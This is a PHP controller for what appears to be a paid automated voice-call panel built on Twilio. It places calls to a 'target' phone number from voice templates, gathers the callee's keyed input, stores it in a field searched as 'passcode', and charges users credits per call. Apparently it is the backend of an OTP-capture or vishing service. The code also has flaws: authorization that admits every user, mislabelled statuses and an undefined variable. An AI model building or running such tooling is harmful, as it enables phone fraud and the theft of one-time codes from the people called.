<?php
App::uses('CakeTime','Utility');
App::import('Vendor','Twilio',array('file'=>'twilio'. DS .'autoload.php'));
use Twilio\Rest\Client;

class CallsController extends AppController {
	public $components = array('DatabaseFunction');
	public $default_conditions = array();
	
	public function delete_selected() {
		$id = $this->request->data['id'];
		$id = json_decode($id,true);
		
		$this->autoRender = false;
		$this->DatabaseFunction->delete_record(
			$this->Call, 
			$id,
			true,
			'Call History'
		);
	}
	
	public function history() {
		
		$default_conditions = array();
		if($this->Auth->user('role')=='User'){
			$default_conditions = array(
				'Call.user_id' => $this->Auth->user('id')
			);
		}
		
		$data =  $this->get_call_histories($default_conditions);
		$this->set('data',$data['data']);
		if(isset($this->request->query['layout']) && $this->request->query['layout']=='ajax'){
			$this->autoRender = false;
			echo json_encode($data);
		}
	}
	
	public function get_call_histories($submitted_conditions = array()) {
		$this->default_conditions = array_merge($this->default_conditions, $submitted_conditions);
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('VoiceApi.name', 'server_name'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('VoiceTemplate.name', 'template_name'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('Call.to_number', 'phone_number'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('Call.response', 'passcode'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('Call.call_status', 'call_status'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('User.username', 'phone_number'));
		
		$pagination_fields = array();

		$pagination_fields_reorder = array(
			'Call.id',
			'VoiceApi.name',
			'VoiceTemplate.name',
			'Call.to_number',
			'Call.response',
			'Call.call_status',
			'User.username',
		);
		
		$searchable_fields = array(
			'VoiceApi.name',
			'VoiceTemplate.name',
			'Call.to_number',
			'Call.response',
			'Call.call_status',
			'User.username',
		);
		
		$default_order = array('Call.id'=>'DESC');
		$default_contain = array('VoiceApi','VoiceTemplate','User');
		$default_conditions = array();
		$default_joins = array();
		$default_group = array();
		$default_recursive = -1;
		
		$data = $this->DatabaseFunction->get_data_table_ajax_records(
			$this->Call,
			$pagination_fields,
			$pagination_fields_reorder,
			$searchable_fields,
			array(),
			array(),
			$default_contain,
			$this->default_conditions,
			$default_order,
			$default_recursive,
			$default_joins,
			$default_group,
			true
		);
		
		foreach($data['data'] as $key=>$value){
			if($data['data'][$key]['Call.call_status'] == 'completed'){
				$data['data'][$key]['Call.call_status'] = '<span class="mb-1 badge bg-success">Completed</span>';
			}else if($data['data'][$key]['Call.call_status'] == 'in-progress'){
				$data['data'][$key]['Call.call_status'] = '<span class="mb-1 badge bg-primary">In-Progress</span>';
			}else if($data['data'][$key]['Call.call_status'] == 'initiated'){
				$data['data'][$key]['Call.call_status'] = '<span class="mb-1 badge bg-warning">Initiated</span>';
			}else if($data['data'][$key]['Call.call_status'] == 'ringing'){
				$data['data'][$key]['Call.call_status'] = '<span class="mb-1 badge bg-info">Ringing</span>';
			}else if($data['data'][$key]['Call.call_status'] == 'no-answer'){
				$data['data'][$key]['Call.call_status'] = '<span class="mb-1 badge bg-dark">No Answer</span>';
			}else if($data['data'][$key]['Call.call_status'] == 'busy'){
				$data['data'][$key]['Call.call_status'] = '<span class="mb-1 badge bg-dark">Busy</span>';
			}else if($data['data'][$key]['Call.call_status'] == 'canceled'){
				$data['data'][$key]['Call.call_status'] = '<span class="mb-1 badge bg-dark">Busy</span>';
			}else if($data['data'][$key]['Call.call_status'] == 'failed'){
				$data['data'][$key]['Call.call_status'] = '<span class="mb-1 badge bg-danger">Failed</span>';
			}else{
				
			}
		}
		
		
		return $data;
	}
	
	public function index() {
		$this->loadModel('VoiceTemplate');
		$template_list = $this->VoiceTemplate->find('list',array(
			'fields'=>array(
				'VoiceTemplate.id',
				'VoiceTemplate.name',
			),
			'conditions'=>array(
				'VoiceTemplate.status' => 1
			)
		));
		$this->set('template_list',$template_list);
		
		$this->loadModel('VoiceApi');
		$server_list = $this->VoiceApi->find('list',array(
			'fields'=>array(
				'VoiceApi.id',
				'VoiceApi.name',
			),
			'conditions'=>array(
				'VoiceApi.status' => 1
			)
		));
		$this->set('server_list',$server_list);
		
		if ($this->request->is('post') || $this->request->is('put')) {	
			debug($this->request->data);
			exit();
		}
	}
	
	public function start_call() {
		$this->autoRender = false;
		$this->layout = "ajax";
		if($this->request->is('put') || $this->request->is('post')) {
			
			$this->loadModel('User');
			$user_datasource = $this->User->getDataSource();
			
			$settings_data = $this->Setting->find('first',array(
				'fields'=> array(
					'Setting.voice_cost',
					'Setting.maintenance',
					'Setting.user_telegram_bot',
				),
				'recursive'=>-1
			));
			$required_amount = $settings_data['Setting']['voice_cost'];
			$is_maintenance = (bool) $settings_data['Setting']['maintenance'];
			
			if($is_maintenance){
				$result = array(
					"success" => false,
					"msg" => "Voice panel is currently on maintenance, Please comeback later.",
				);
				echo json_encode($result);
				exit();
			}
			
			if($this->Auth->user('role') == 'User'){
				
				$user_data = $this->User->find('first',array(
					'fields'=>array(
						'User.id',
						'User.credits'
					),
					'conditions'=>array(
						'User.id'=>$this->Auth->user('id'),
						'User.status'=>1,
					),
					'recursive'=>-1
				));
				
				if(count($user_data) >=1){
					$current_user_credits = $user_data['User']['credits'];
					$remaining_user_credits_after_deduction = ($current_user_credits - $required_amount);
					
					if($remaining_user_credits_after_deduction < 0){
						$result = array(
							"success" => false,
							"msg" => "Insuficient credit.\n\nCurrent Voice Credits: ".$current_user_credits."\nVoice Credit Required: ". $required_amount,
						);
						echo json_encode($result);
						exit();
					}
					
				}else{
					$result = array(
						"success" => false,
						"msg" => "You are not allowed to access this page!",
					);
					echo json_encode($result);
					exit();
				}
			}
			
			$country_code = $this->request->data['Call']['country_code'];
			$to_number = '+'.$country_code.$this->request->data['Call']['phone_number'];
			$template_id = $this->request->data['Call']['template'];
			$server_id = $this->request->data['Call']['server_id'];
			
			$this->loadModel('VoiceApi');
			$server_data = $this->VoiceApi->find('first',array(
				'fields'=>array(
					'VoiceApi.id',
					'VoiceApi.sid',
					'VoiceApi.token',
					'VoiceApi.phone_number',
				),
				'conditions'=>array(
					'VoiceApi.status' => 1
				)
			));
			
			if(count($server_data) <=0){
				$result = array(
					"success" => true,
					"sid" => $call->sid,
					"msg" => "Server is not active",
				);
				echo json_encode($result);
				exit();
			}
			
			
			
			$account_sid = $server_data['VoiceApi']['sid'];
			$auth_token = $server_data['VoiceApi']['token'];
			$from_number = $server_data['VoiceApi']['phone_number'];
			$to_number = $to_number;
			
			$client = new Client($account_sid, $auth_token);
			$call = $client->account->calls->create(  
				$to_number,
				$from_number,
				array(
					"method" => "POST",
					"statusCallback" => Configure::read('BASE_URL'). "webhook/call_status?server=$server_id&template=$template_id&cost=$required_amount",
					"statusCallbackEvent"=>array("initiated","ringing","answered","completed"),
					"statusCallbackMethod" => "POST",
					"url" => Configure::read('BASE_URL'). "webhook/gather?server=$server_id&template=$template_id",
				)
			);
				
			$this->loadModel('Call');
			$data['Call']['user_id'] = $this->Auth->user('id');
			$data['Call']['call_sid'] = $call->sid;
			$data['Call']['to_number'] = $to_number;
			$data['Call']['voice_api_id'] = $server_id;
			$data['Call']['voice_template_id'] = $template_id;
			$data['Call']['country_code'] = $country_code;
			$data['Call']['status'] = 1;
			
			if($this->Call->save($data)){
				$result = array(
					"success" => true,
					"sid" => $call->sid,
					"msg" => "Voice call has been successfully sent to target!",
				);
				echo json_encode($result);
				exit();
				
			}else{
				$result = array(
					"success" => false,
					"msg" => "An error occured!",
				);
				echo json_encode($result);
				exit();
			}
		}else{
			$this->response->statusCode(403);
		}
	}
	
	public function get_realtime_call_status(){
		$this->autoRender = false;
		$this->layout = "ajax";

		$result = array(
			"success" => false,
			"msg" => "You are not allowed to access this page!",
		);
		
		if($this->request->is('put') || $this->request->is('post')) {
			$data = $this->Call->find('first',array(
				'conditions'=>array(
					'Call.call_sid'=>$this->request->data['sid']
				)
			));
			
			if(count($data)>=1){
				
				$result = array(
					"success" => true,
					"msg" => "Success!",
					"number" => $data['Call']['to_number'],
					"call_status" => $data['Call']['call_status'],
					"dial_error" => $data['Call']['dial_error'],
					"response" => $data['Call']['response'],
				);
				
			}else{
				$result = array(
					"success" => false,
					"msg" => "Call session not found!",
				);
			}
			
		}
		echo json_encode($result);
	}
	
	public function beforeFilter() {
		parent::beforeFilter();
	}
	
	public function isAuthorized($user) {
		return true;
	}
}
?>